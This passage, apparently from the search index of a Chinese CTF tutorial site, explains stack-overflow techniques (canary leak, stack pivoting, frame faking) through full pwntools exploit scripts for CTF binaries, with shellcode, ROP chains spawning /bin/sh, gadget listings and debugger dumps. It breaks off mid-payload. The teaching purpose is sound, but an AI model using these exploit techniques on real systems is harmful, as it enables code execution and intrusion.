\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 0x555555554a23 mov eax, 0 0x555555554a28 mov rcx, qword ptr [ rbp - 8 ] 0x555555554a2c xor rcx, qword ptr fs: [ 0x28 ] 0x555555554a35 je 0x555555554a3c \u2193 0x555555554a3c leave \u6240\u4ee5\u5728\u7b2c\u4e8c\u6b21\u8f93\u5165 name \u65f6\u6ea2\u51fa\u8986\u76d6 rip \u6700\u540e\u4e00\u4e2a\u5b57\u8282\uff1a payload = 'a' * ( 0x30 - 0x8 ) payload += p64 ( canary ) payload += p64 ( 0xdeadbeef ) payload += ' \\x3e ' \u5229\u7528\u7a0b\u5e8f \u00b6 from pwn import * context . log_level = 'debug' p = process ( \"./babypie\" ) elf = ELF ( \"./babypie\" ) getshell = 0xA3E payload = 'a' * ( 0x30 - 0x8 + 1 ) p . recvuntil ( \"Name: \\n \" ) p . send ( payload ) p . recvuntil ( 'a' * ( 0x30 - 0x8 + 1 )) canary = u64 ( p . recv ( 7 ) . rjust ( 8 , ' \\x00 ' )) log . info ( \"canary:\" + hex ( canary )) payload = 'a' * ( 0x30 - 0x8 ) payload += p64 ( canary ) payload += p64 ( 0xdeadbeef ) payload += ' \\x3e ' p . recvuntil ( \": \\n \" ) gdb . attach ( p ) p . send ( payload ) p . interactive ()","title":"\u82b1\u5f0f\u6808\u6ea2\u51fa\u6280\u5de7"},{"location":"Pwn/stackoverflow/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7/#_1","text":"","title":"\u82b1\u5f0f\u6808\u6ea2\u51fa\u6280\u5de7"},{"location":"Pwn/stackoverflow/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7/#stack-pivoting","text":"","title":"stack pivoting"},{"location":"Pwn/stackoverflow/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7/#_2","text":"\u52ab\u6301\u6808\u6307\u9488\u6307\u5411\u653b\u51fb\u8005\u6240\u80fd\u63a7\u5236\u7684\u5185\u5b58\u5904\uff0c\u7136\u540e\u518d\u5728\u76f8\u5e94\u7684\u4f4d\u7f6e\u8fdb\u884c ROP\u3002 eip \u7684\u503c\u662f\u901a\u8fc7 esp \u4e0e ret \u6307\u4ee4\u538b\u5165\u3002\u9000\u51fa\u51fd\u6570\u65f6\uff0c\u5148\u6267\u884c leave \uff0c\u8ba9 esp \u6307\u5411 ebp \uff0c\u7136\u540e esp \u52a0\u4e00\u4e2a\u673a\u5668\u5b57\u957f\u540e\uff0c\u6267\u884c ret \u6307\u4ee4\uff0c\u5c06 esp \u6307\u5411\u7684\u503c\u538b\u5165 eip \u4e2d\u3002 \u53ef\u80fd\u5728\u4ee5\u4e0b\u60c5\u51b5\u9700\u8981\u4f7f\u7528 stack pivoting \u53ef\u4ee5\u63a7\u5236\u7684\u6808\u6ea2\u51fa\u7684\u5b57\u8282\u6570\u8f83\u5c11\uff0c\u96be\u4ee5\u6784\u9020\u8f83\u957f\u7684 ROP \u94fe \u5f00\u542f\u4e86 PIE \u4fdd\u62a4\uff0c\u6808\u5730\u5740\u672a\u77e5\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u6808\u52ab\u6301\u5230\u5df2\u77e5\u7684\u533a\u57df\u3002 \u5176\u5b83\u6f0f\u6d1e\u96be\u4ee5\u5229\u7528\uff0c\u6211\u4eec\u9700\u8981\u8fdb\u884c\u8f6c\u6362\uff0c\u6bd4\u5982\u8bf4\u5c06\u6808\u52ab\u6301\u5230\u5806\u7a7a\u95f4\uff0c\u4ece\u800c\u5728\u5806\u4e0a\u5199 rop \u53ca\u8fdb\u884c\u5806\u6f0f\u6d1e\u5229\u7528","title":"\u539f\u7406"},{"location":"Pwn/stackoverflow/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7/#_3","text":"\u5229\u7528 stack pivoting \u6709\u4ee5\u4e0b\u51e0\u4e2a\u8981\u6c42 \u53ef\u4ee5\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u3002 \u53ef\u4ee5\u63a7\u5236 sp \u6307\u9488\uff08\u6808\u9876\u6307\u9488\uff09\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u63a7\u5236\u6808\u6307\u9488\u4f1a\u4f7f\u7528 ROP\uff0c\u5e38\u89c1\u7684\u63a7\u5236\u6808\u6307\u9488\u7684 gadgets \u4e00\u822c\u662f pop rsp/esp \u5f53\u7136\uff0c\u8fd8\u4f1a\u6709\u4e00\u4e9b\u5176\u5b83\u7684\u59ff\u52bf\u3002\u6bd4\u5982\u8bf4 libc_csu_init \u4e2d\u7684 gadgets\uff0c\u6211\u4eec\u901a\u8fc7\u504f\u79fb\u5c31\u53ef\u4ee5\u5f97\u5230\u63a7\u5236 rsp \u6307\u9488\u3002\u4e0a\u9762\u7684\u662f\u6b63\u5e38\u7684\uff0c\u4e0b\u9762\u7684\u662f\u504f\u79fb\u7684\u3002 \u53ea\u6709\u662f\u7528\u5230\u4e86 libc \uff0c\u7f16\u8bd1\u65f6 gcc \u4f1a\u5c06 libc_csu_init \u52a0\u5230\u7a0b\u5e8f\u91cc\u3002\u7531\u8fd9\u4e2a\u51fd\u6570\u4e5f\u5ef6\u4f38\u4e86\u4e00\u79cd ROP \u6280\u5de7\uff1aret2cus gef\u27a4 x/7i 0x000000000040061a 0x40061a <__libc_csu_init+90>: pop rbx 0x40061b <__libc_csu_init+91>: pop rbp 0x40061c <__libc_csu_init+92>: pop r12 0x40061e <__libc_csu_init+94>: pop r13 0x400620 <__libc_csu_init+96>: pop r14 0x400622 <__libc_csu_init+98>: pop r15 0x400624 <__libc_csu_init+100>: ret gef\u27a4 x/7i 0x000000000040061d 0x40061d <__libc_csu_init+93>: pop rsp 0x40061e <__libc_csu_init+94>: pop r13 0x400620 <__libc_csu_init+96>: pop r14 0x400622 <__libc_csu_init+98>: pop r15 0x400624 <__libc_csu_init+100>: ret \u5b58\u5728\u53ef\u4ee5\u63a7\u5236\u5185\u5bb9\u7684\u5185\u5b58\uff0c\u4e00\u822c\u6709\u5982\u4e0b bss \u6bb5\u3002\u7531\u4e8e\u8fdb\u7a0b\u6309\u9875\u5206\u914d\u5185\u5b58\uff0c\u5206\u914d\u7ed9 bss \u6bb5\u7684\u5185\u5b58\u5927\u5c0f\u81f3\u5c11\u4e00\u4e2a\u9875 (4k\uff0c0x1000) \u5927\u5c0f\u3002\u7136\u800c\u4e00\u822c bss \u6bb5\u7684\u5185\u5bb9\u7528\u4e0d\u4e86\u8fd9\u4e48\u591a\u7684\u7a7a\u95f4\uff0c\u5e76\u4e14 bss \u6bb5\u5206\u914d\u7684\u5185\u5b58\u9875\u62e5\u6709\u8bfb\u5199\u6743\u9650\u3002 heap\u3002\u4f46\u662f\u8fd9\u4e2a\u9700\u8981\u6211\u4eec\u80fd\u591f\u6cc4\u9732\u5806\u5730\u5740\u3002","title":"\u4f7f\u7528\u6761\u4ef6"},{"location":"Pwn/stackoverflow/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7/#_4","text":"\u4ee5 X-CTF Quals 2016 - b0verfl0w \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u6e90\u7a0b\u5e8f\u4e3a 32 \u4f4d\uff0c\u4e5f\u6ca1\u6709\u5f00\u542f NX \u4fdd\u62a4\uff0c\u4e0b\u9762\u6211\u4eec\u6765\u627e\u4e00\u4e0b\u7a0b\u5e8f\u7684\u6f0f\u6d1e\uff1a signed int vul () { char s ; // [sp+18h] [bp-20h]@1 puts ( \" \\n ======================\" ); puts ( \" \\n Welcome to X-CTF 2016!\" ); puts ( \" \\n ======================\" ); puts ( \"What's your name?\" ); fflush ( stdout ); fgets ( & s , 50 , stdin ); printf ( \"Hello %s.\" , & s ); fflush ( stdout ); return 1 ; } \u5b58\u5728\u6808\u6ea2\u51fa\u6f0f\u6d1e\u3002\u4f46\u662f\u5176\u6240\u80fd\u6ea2\u51fa\u7684\u5b57\u8282\u5c31\u53ea\u6709 50-0x20-4=14 \u4e2a\u5b57\u8282\u3002 \u7a0b\u5e8f\u672c\u8eab\u5e76\u6ca1\u6709\u5f00\u542f\u5806\u6808\u4fdd\u62a4\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5728\u6808\u4e0a\u5e03\u7f6e shellcode \u5e76\u6267\u884c\u3002\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b \u5229\u7528\u6808\u6ea2\u51fa\u5e03\u7f6e shellcode \u63a7\u5236 eip \u6307\u5411 shellcode \u5904 \u7531\u4e8e\u7a0b\u5e8f\u672c\u8eab\u4f1a\u5f00\u542f ASLR \u4fdd\u62a4\uff0c\u6240\u4ee5\u6211\u4eec\u5f88\u96be\u76f4\u63a5\u77e5\u9053 shellcode \u7684\u5730\u5740\u3002\u4f46\u662f\u6808\u4e0a**\u76f8\u5bf9\u504f\u79fb\u662f\u56fa\u5b9a\u7684**\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6808\u6ea2\u51fa\u5bf9 esp \u8fdb\u884c\u64cd\u4f5c\uff0c\u4f7f\u5176\u6307\u5411 shellcode \u5904\uff0c\u5e76\u4e14\u76f4\u63a5\u63a7\u5236\u7a0b\u5e8f\u8df3\u8f6c\u81f3 esp \u5904\u3002\u90a3\u4e0b\u9762\u5c31\u662f\u627e\u63a7\u5236\u7a0b\u5e8f\u8df3\u8f6c\u5230 esp \u5904\u7684 gadgets \u4e86\u3002 \u279c X-CTF Quals 2016 - b0verfl0w git: ( iromise ) \u2717 ROPgadget --binary b0verfl0w --only 'jmp|ret' Gadgets information ============================================================ 0x08048504 : jmp esp 0x0804836a : ret 0x0804847e : ret 0xeac1 Unique gadgets found: 3 \u8fd9\u91cc\u6211\u4eec\u53d1\u73b0\u6709\u4e00\u4e2a\u53ef\u4ee5\u76f4\u63a5\u8df3\u8f6c\u5230 esp \u7684 gadgets\u3002\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5e03\u7f6e payload \u5982\u4e0b shellcode|padding|fake ebp|0x08048504|set esp point to shellcode and jmp esp \u90a3\u4e48\u6211\u4eec payload \u4e2d\u7684\u6700\u540e\u4e00\u90e8\u5206\u6539\u5982\u4f55\u8bbe\u7f6e esp \u5462\uff0c\u53ef\u4ee5\u77e5\u9053 size(shellcode+padding)=0x20 size(fake ebp)=0x4 size(0x08048504)=0x4 \u6240\u4ee5\u6211\u4eec\u6700\u540e\u4e00\u6bb5\u9700\u8981\u6267\u884c\u7684\u6307\u4ee4\u5c31\u662f sub esp,0x28 jmp esp \u6240\u4ee5\u6700\u540e\u7684 exp \u5982\u4e0b from pwn import * sh = process('./b0verfl0w') shellcode_x86 = \"\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\" shellcode_x86 += \"\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\" shellcode_x86 += \"\\x0b\\xcd\\x80\" sub_esp_jmp = asm('sub esp, 0x28;jmp esp') jmp_esp = 0x08048504 payload = shellcode_x86 + ( 0x20 - len(shellcode_x86)) * 'b' + 'bbbb' + p32(jmp_esp) + sub_esp_jmp sh.sendline(payload) sh.interactive() \u8fd9\u91cc\u8865\u5145\u4e00\u4e0b\u5177\u4f53\u7a0b\u5e8f\u8fc7\u7a0b\uff1a payload \u7ed3\u6784\u5982\u4e0b\uff1a shellcode|padding|fake ebp|0x08048504|set esp point to shellcode and jmp esp \u9996\u5148\u5c31\u662f\u5199\u5165 shellcode \u3001\u586b\u5145\u3001\u8986\u76d6 ebp \uff1b \u5c06 eip \u8986\u76d6\u4e3a jmp esp \uff1beip \u662f\u4e0b\u4e00\u6761\u6307\u4ee4\u5b58\u50a8\u5bc4\u5b58\u5668\u3002\u5f53\u7a0b\u5e8f\u8fd0\u884c jmp esp \u4e4b\u540e\uff0c\u7a0b\u5e8f\u8fd0\u884c\u6307\u9488\u5c06\u4ece text \u6bb5\u8f6c\u79fb\u5230\u6808\u4e0a\uff0c\u5c06\u6808\u4e0a\u7684\u6570\u636e\u5f53\u505a\u4ee3\u7801\u6307\u4ee4\u8fd0\u884c\u3002\u8fd9\u6837\u64cd\u4f5c\u4e4b\u540e\uff0c set esp point to shellcode and jmp esp \u8fd9\u4e00\u90e8\u5206\u6808\u6570\u636e\u88ab\u5f53\u505a\u662f\u4ee3\u7801\u6307\u4ee4\u6267\u884c\u4e86\u3002 sub esp,0x28;jmp esp \uff1b\u5c06 esp \u8c03\u6574\u5230 shellcode \u7684\u5f00\u59cb\uff0c\u5f53\u524d esp \u548cshellcode \u7684\u8ba1\u7b97\u770b\u524d\u9762\uff1b\u7136\u540e\u518d\u4e00\u6b21 jmp esp \uff0c\u5c06\u8fd0\u884c\u6307\u9488\u8c03\u6574\u5230 shellcode \u3002","title":"\u793a\u4f8b"},{"location":"Pwn/stackoverflow/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7/#frame-faking","text":"\u4e5f\u5c31\u662f\u6808\u8fc1\u79fb","title":"frame faking"},{"location":"Pwn/stackoverflow/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7/#_5","text":"\u6982\u62ec\u5730\u8bb2\uff0c\u6211\u4eec\u5728\u4e4b\u524d\u8bb2\u7684\u6808\u6ea2\u51fa\u4e0d\u5916\u4e4e\u4e24\u79cd\u65b9\u5f0f \u63a7\u5236\u7a0b\u5e8f EIP \u63a7\u5236\u7a0b\u5e8f EBP \u5176\u6700\u7ec8\u90fd\u662f\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u3002\u5728 frame faking \u4e2d\uff0c\u6211\u4eec\u6240\u5229\u7528\u7684\u6280\u5de7\u4fbf\u662f\u540c\u65f6\u63a7\u5236 EBP \u4e0e EIP\uff0c\u8fd9\u6837\u6211\u4eec\u5728\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u7684\u540c\u65f6\uff0c\u4e5f\u6539\u53d8\u7a0b\u5e8f\u6808\u5e27\u7684\u4f4d\u7f6e\u3002\u4e00\u822c\u6765\u8bf4\u5176 payload \u5982\u4e0b buffer padding|fake ebp|leave ret addr| \u5373\u6211\u4eec\u5229\u7528\u6808\u6ea2\u51fa\u5c06\u6808\u4e0a\u6784\u9020\u4e3a\u5982\u4e0a\u683c\u5f0f\u3002\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u8bb2\u4e0b\u540e\u9762\u4e24\u4e2a\u90e8\u5206 \u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u88ab\u6211\u4eec\u8986\u76d6\u4e3a\u6267\u884c leave ret \u7684\u5730\u5740\uff0c\u8fd9\u5c31\u8868\u660e\u4e86\u51fd\u6570\u5728\u6b63\u5e38\u6267\u884c\u5b8c\u81ea\u5df1\u7684 leave ret \u540e\uff0c\u8fd8\u4f1a\u518d\u6b21\u6267\u884c\u4e00\u6b21 leave ret\u3002 \u5176\u4e2d fake ebp \u4e3a\u6211\u4eec\u6784\u9020\u7684\u6808\u5e27\u7684\u57fa\u5730\u5740\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u91cc\u662f\u4e00\u4e2a\u5730\u5740\u3002\u4e00\u822c\u6765\u8bf4\u6211\u4eec\u6784\u9020\u7684\u5047\u7684\u6808\u5e27\u5982\u4e0b fake ebp | v ebp2|target function addr|leave ret addr|arg1|arg2 \u8fd9\u91cc\u6211\u4eec\u7684 fake ebp \u6307\u5411 ebp2\uff0c\u5373\u5b83\u4e3a ebp2 \u6240\u5728\u7684\u5730\u5740\u3002\u901a\u5e38\u6765\u8bf4\uff0c\u8fd9\u91cc\u90fd\u662f\u6211\u4eec\u80fd\u591f\u63a7\u5236\u7684\u53ef\u8bfb\u7684\u5185\u5bb9\u3002 leave \u6307\u4ee4\u76f8\u5f53\u4e8e mov esp, ebp # \u5c06ebp\u7684\u503c\u8d4b\u7ed9esp pop ebp # \u5f39\u51faebp","title":"\u539f\u7406"},{"location":"Pwn/stackoverflow/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7/#_6","text":"\u4ed4\u7ec6\u8bf4\u4e00\u4e0b\u57fa\u672c\u7684\u63a7\u5236\u8fc7\u7a0b\uff1a \u5728\u6709\u6808\u6ea2\u51fa\u7684\u7a0b\u5e8f\u6267\u884c leave \u65f6\uff0c\u5176\u5206\u4e3a\u4e24\u4e2a\u6b65\u9aa4 mov esp, ebp \uff0c\u8fd9\u4f1a\u5c06 esp \u4e5f\u6307\u5411\u5f53\u524d\u6808\u6ea2\u51fa\u6f0f\u6d1e\u7684 ebp \u57fa\u5730\u5740\u5904\u3002 pop ebp\uff0c \u8fd9\u4f1a\u5c06\u6808\u4e2d\u5b58\u653e\u7684 fake ebp \u7684\u503c\u8d4b\u7ed9 ebp\u3002\u5373\u6267\u884c\u5b8c\u6307\u4ee4\u4e4b\u540e\uff0cebp \u4fbf\u6307\u5411\u4e86 ebp2\uff0c\u4e5f\u5c31\u662f\u4fdd\u5b58\u4e86 ebp2 \u6240\u5728\u7684\u5730\u5740\u3002 \u6267\u884c ret \u6307\u4ee4\uff0c\u4f1a\u518d\u6b21\u6267\u884c\uff08\u6ea2\u51fa\u5199\u5165\u7684\uff09 leave ret \u6307\u4ee4\u3002 \u6267\u884c leave \u6307\u4ee4\uff0c\u5176\u5206\u4e3a\u4e24\u4e2a\u6b65\u9aa4 mov esp, ebp \uff0c\u8fd9\u4f1a\u5c06 esp \u6307\u5411 ebp2\u3002 pop ebp\uff0c\u6b64\u65f6\uff0c\u4f1a\u5c06 ebp \u7684\u5185\u5bb9\u8bbe\u7f6e\u4e3a ebp2 \u7684\u503c\uff0c\u540c\u65f6 esp \u4f1a\u6307\u5411 target function\u3002 \u6267\u884c ret \u6307\u4ee4\uff0c\u8fd9\u65f6\u5019\u7a0b\u5e8f\u5c31\u4f1a\u6267\u884c target function\uff0c\u5f53\u5176\u8fdb\u884c\u7a0b\u5e8f\u7684\u65f6\u5019\u4f1a\u6267\u884c push ebp\uff0c\u4f1a\u5c06 ebp2 \u503c\u538b\u5165\u6808\u4e2d\uff0c mov ebp, esp\uff0c\u5c06 ebp \u6307\u5411\u5f53\u524d\u57fa\u5730\u5740\u3002 \u6b64\u65f6\u7684\u6808\u7ed3\u6784\u5982\u4e0b ebp | v ebp2|leave ret addr|arg1|arg2 \u5f53\u7a0b\u5e8f\u6267\u884c\u65f6\uff0c\u5176\u4f1a\u6b63\u5e38\u7533\u8bf7\u7a7a\u95f4\uff0c\u540c\u65f6\u6211\u4eec\u5728\u6808\u4e0a\u4e5f\u5b89\u6392\u4e86\u8be5\u51fd\u6570\u5bf9\u5e94\u7684\u53c2\u6570\uff0c\u6240\u4ee5\u7a0b\u5e8f\u4f1a\u6b63\u5e38\u6267\u884c\u3002 \u7a0b\u5e8f\u7ed3\u675f\u540e\uff0c\u5176\u53c8\u4f1a\u6267\u884c\u4e24\u6b21 leave ret addr\uff0c\u6240\u4ee5\u5982\u679c\u6211\u4eec\u5728 ebp2 \u5904\u5e03\u7f6e\u597d\u4e86\u5bf9\u5e94\u7684\u5185\u5bb9\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u4e00\u76f4\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\u3002 \u53ef\u4ee5\u770b\u51fa\u5728 fake frame \u4e2d\uff0c\u6211\u4eec\u6709\u4e00\u4e2a\u9700\u6c42\u5c31\u662f\uff0c\u6211\u4eec\u5fc5\u987b\u5f97\u6709\u4e00\u5757\u53ef\u4ee5\u5199\u7684\u5185\u5b58\uff0c\u5e76\u4e14\u6211\u4eec\u8fd8\u77e5\u9053\u8fd9\u5757\u5185\u5b58\u7684\u5730\u5740\uff0c\u8fd9\u4e00\u70b9\u4e0e stack pivoting \u76f8\u4f3c\uff08\u901a\u8fc7\u504f\u79fb\u83b7\u53d6\u6808\u4e0a\u5730\u5740\uff09\u3002","title":"\u63a7\u5236\u8fc7\u7a0b"},{"location":"Pwn/stackoverflow/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7/#_7","text":"","title":"\u4f8b\u9898"},{"location":"Pwn/stackoverflow/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7/#2018-over","text":"\u9898\u76ee\u53ef\u4ee5\u5728 ctf-challenge \u4e2d\u627e\u5230","title":"2018 \u5b89\u6052\u676f over"},{"location":"Pwn/stackoverflow/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7/#_8","text":"","title":"\u5206\u6790"},{"location":"Pwn/stackoverflow/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7/#_9","text":"Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE 64 \u4f4d\u52a8\u6001\u94fe\u63a5\u7684\u7a0b\u5e8f, \u6ca1\u6709\u5f00 PIE \u548c canary \u4fdd\u62a4, \u4f46\u5f00\u4e86 NX \u4fdd\u62a4","title":"\u6587\u4ef6\u4fe1\u606f"},{"location":"Pwn/stackoverflow/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7/#_10","text":"__int64 __fastcall main ( __int64 a1 , char ** a2 , char ** a3 ) { setvbuf ( stdin , 0L L , 2 , 0L L ); setvbuf ( stdout , 0L L , 2 , 0L L ); while ( sub_400676 () ) ; return 0L L ; } int sub_400676 () { char buf [ 80 ]; // [rsp+0h] [rbp-50h] memset ( buf , 0 , sizeof ( buf )); putchar ( '>' ); read ( 0 , buf , 96uLL ); return puts ( buf ); } read \u80fd\u8bfb\u5165 96 \u4f4d, \u4f46 buf \u7684\u957f\u5ea6\u53ea\u6709 80, \u56e0\u6b64\u53ea\u80fd\u8986\u76d6 rbp \u4ee5\u53ca ret addr \u6765\u8fdb\u884c rop \u4e86","title":"\u6f0f\u6d1e\u51fd\u6570"},{"location":"Pwn/stackoverflow/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7/#_11","text":"\u5f53\u6808\u6ea2\u51fa\u957f\u5ea6\u4e0d\u591f\u65f6\uff0c\u53ef\u4ee5\u5c1d\u8bd5 frame faking \uff08\u6808\u8fc1\u79fb\uff09\u3002\u8fd9\u5c31\u9700\u8981\u4e00\u4e2a\u80fd\u88ab\u6211\u4eec\u5199\u5165\u3001\u77e5\u9053\u5730\u5740\u7684\u5185\u5b58\u3002\u8fd9\u6761\u9898\u76ee\u7684\u8bdd\uff0c\u6211\u4eec\u53ea\u80fd\u5f80\u6808\u4e0a\u5199\u5165\u6570\u636e\uff0c\u6240\u4ee5\u60f3\u529e\u6cd5\u6cc4\u9732\u6808\u5730\u5740\u3002","title":"\u601d\u8def"},{"location":"Pwn/stackoverflow/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7/#leak-stack-addr","text":"\u6808\u5730\u5740\u6bcf\u6b21\u8fd0\u884c\u90fd\u4e0d\u4e00\u6837\uff0c\u9700\u8981\u63a7\u5236\u7a0b\u5e8f\u6765\u6cc4\u9732\u6808\u5730\u5740\u3002\u8fd9\u6761\u9898\u76ee\u6ca1\u6709\u5f00 canary \uff0c\u7136\u540e\u5728 IDA \u6216\u8005 gdb \u5206\u6790 sub_400676 \u7684\u6808\u7ed3\u6784\uff0c\u53d1\u73b0 buf \u8986\u76d6 80 \u5b57\u8282\u4e4b\u540e\uff0c\u5c31\u5230 rbp \u9876\uff0c\u8bfb\u5165\u7684 read \u4e5f\u6ca1\u6709\u7ed9\u5b57\u7b26\u4e32\u672b\u5c3e\u63a5\u4e0a \\x00 \u7684\u7ed3\u675f\u7b26\uff0c\u6240\u4ee5\u53ef\u4ee5\u5c06 ebp \u7684\u503c\u6cc4\u9732\u51fa\u6765\u3002 ebp \u7684\u503c\u662f\u4e0a\u4e00\u4e2a\u6808\u7684\u6808\u9876\uff0c\u6cc4\u9732\u4e4b\u540e\u901a\u8fc7\u504f\u79fb\u8ba1\u7b97\u5f97\u5230 buf \u5199\u5165\u7684\u6808\u5730\u5740\u3002gdb \u8c03\u8bd5\u540e\uff0c\u5f97\u51fa\u504f\u79fb\u4e3a 0x70 # leak ebp p . sendafter ( \">\" , 'A' * 0x50 ) stack = u64 ( p . recvuntil ( \" \\x7f \" )[ - 6 : ] . ljust ( 8 , ' \\0 ' )) - 0x70 log . info ( \"stack:\" + hex ( stack ))","title":"leak stack addr"},{"location":"Pwn/stackoverflow/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7/#leak-libc","text":"\u7136\u540e\u5c31\u662f\u6784\u9020 ROP \u94fe\uff0c\u56e0\u4e3a\u53ef\u63a7\u5199\u5165\u662f\u5728\u6808\u4e0a\uff0c\u6240\u4ee5\u6784\u9020\u5982\u4e0b\uff1a ROP|padding|fake ebp|leave ret addr| leave ret addr \u5c31\u7528 ROPgadget \u627e\u4e00\u4e0b\uff1a ~$ ROPgadget --binary over.over --only 'leave|ret' Gadgets information ============================================================ 0x00000000004006be : leave ; ret 0x0000000000400509 : ret 0x00000000004007d0 : ret 0xfffe fake ebp \u586b\u5165 buf \u7684\u771f\u5b9e\u5730\u5740\u3002 ROP \u4e24\u4e2a\u529f\u80fd\uff1a\u6cc4\u9732 libc \u5730\u5740\u3001ret2text\u3002\u6cc4\u9732\u5730\u5740\u5c31\u7528\u5e38\u89c4\u7684 puts \u51fd\u6570\u3002 # leak libc payload = p64 ( 0xdeadbeef ) + p64 ( pop_rdi ) + p64 ( puts_got ) + p64 ( puts_plt ) payload += p64 ( sub_addr ) # ret2text payload = payload . ljust ( 0x50 , 'a' ) # padding payload += p64 ( stack ) payload += p64 ( leave_ret )","title":"leak libc"},{"location":"Pwn/stackoverflow/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7/#getshell","text":"\u6cc4\u9732\u5730\u5740\u4e4b\u540e\u5c31\u518d\u4e00\u6b21 frame faking \uff0c\u53ea\u4e0d\u8fc7\u8fd9\u6b21\u662f\u6267\u884c system(\"/bin/sh\") \u3002 \u4f46\u662f\u5982\u679c fake ebp \u4f9d\u65e7\u586b\u5199\u539f\u503c\u4f1a\u62a5\u9519\uff0c\u5927\u6982\u539f\u56e0\u662f\u56e0\u4e3a\u4e0a\u9762 ROP \u662f\u76f4\u63a5\u8c03\u7528 sub_400676 \uff0c\u60f3\u6bd4\u6b63\u5e38\u60c5\u51b5\u4e0b\u538b\u6808\u7684\u6570\u91cf\u548c\u539f\u6765\u4e0d\u4e00\u6837\uff0c\u6240\u4ee5\u8981\u91cd\u65b0\u8ba1\u7b97\u504f\u79fb\u3002 fake ebp \u4f7f\u7528 ROP1 \u7684\u503c\u65f6\uff1a pwndbg> 0x00000000004006be in ?? () LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA \u2500\u2500\u2500\u2500\u2500 [ REGISTERS ] \u2500\u2500\u2500\u2500\u2500 \u2026\u2026\u2026\u2026 RBP 0x7fffffffdd50 \u2014\u25b8 0x7fffffffdd30 \u25c2\u2014 0x6161616161616161 ( 'aaaaaaaa' ) RSP 0x7fffffffdd00 \u25c2\u2014 0xdeadbeef RIP 0x4006be \u25c2\u2014 leave \u53ef\u4ee5\u770b\u5230 RBP \u7ecf\u8fc7\u4e24\u6b21 leave|ret \u4e4b\u540e\u6307\u5411\u7684\u662f aaaaaaaa \uff0c\u6b63\u5e38\u5e94\u8be5\u662f\u6307\u5411 0xdeadbeef \u3002 \u4e3a\u4e86\u8ba9\u7a0b\u5e8f\u6267\u884c\u6b63\u786e\u5730\u65b9\uff0c\u5c06 fake ebp \u7684\u503c\u51cf 0x30 \uff0c\u8ba9 ebp \u91cd\u65b0\u6307\u5411 0xdeadbeef \uff1a pwndbg> x /20gx 0x7fffffffdd30-0x30 0x7fffffffdd00: 0x00000000deadbeef 0x0000000000400793 0x7fffffffdd10: 0x00007ffff7b99d57 0x00007ffff7a52390 0x7fffffffdd20: 0x0000000000400676 0x6161616161616161 0x7fffffffdd30: 0x6161616161616161 0x6161616161616161 0x7fffffffdd40: 0x6161616161616161 0x6161616161616161 0x7fffffffdd50: 0x00007fffffffdd30 0x00000000004006be 0x7fffffffdd60: 0x6161616161616161 0x6161616161616161 0x7fffffffdd70: 0x6161616161616161 0x6161616161616161 0x7fffffffdd80: 0x00007fffffffdd30 0x00000000004006be 0x7fffffffdd90: 0x00007fffffffde88 0x0000000100000000 payload = p64 ( 0xdeadbeef ) + p64 ( pop_rdi ) + p64 ( binsh_addr ) + p64 ( system_addr ) payload += p64 ( sub_addr ) # ret2text payload = payload.ljust ( 0x50, 'a' ) # padding payload += p64 ( stack ) payload += p64 ( leave_ret 